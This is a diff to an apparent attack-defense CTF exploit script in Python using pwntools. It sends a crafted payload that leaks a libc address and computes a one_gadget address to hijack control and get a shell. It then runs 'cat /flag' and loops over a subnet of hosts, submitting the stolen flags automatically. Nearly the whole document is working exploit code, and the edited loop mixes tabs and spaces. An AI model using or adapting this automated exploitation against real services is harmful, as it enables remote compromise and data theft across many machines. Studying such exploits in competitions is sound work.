@@ -12,16 +12,12 @@ libc=ELF('libc-2.17.so')
 
 def getflag(ip,port):
 	r=remote(ip,port)
-
 	r.recvuntil('code: ')
-
 	payload = ''
 	payload+= '<'*(0x18+3)
 	payload+= '.<.<.<.<.<.'
 	payload+= '<'*(0x38+3)
 	payload+= ',<,<,<,<,<,'
-	print len(payload)
-
 	r.sendline(payload)
 	stderr_addr=int(h(r.recv()),16)
 	libc_base=stderr_addr-libc.symbols['_IO_2_1_stderr_']
@@ -31,7 +27,7 @@ def getflag(ip,port):
 	log.success('libc_base='+str(hex(libc_base)))
 	log.success('one_gadget='+str(hex(one_gadget)))
 	r.send(p64(one_gadget)[::-1][2:])
-	r.sendline('cat flag')
+	r.sendline('cat /flag')
 	return r.recv()
 
 def post(flag):
@@ -48,12 +44,10 @@ if __name__ == '__main__':
             ip = '172.16.5.%d' % i
 	    port=5069
 	    try:
-                content = getflag(ip,port)
-
-                flag = content
-
-                print flag,i
-                post(flag)
-                time.sleep(5)
-            except:
-                continue
+            content = getflag(ip,port)
+        	flag = content
+            print flag,i
+            post(flag)
+            time.sleep(5)
+        except:
+            continue
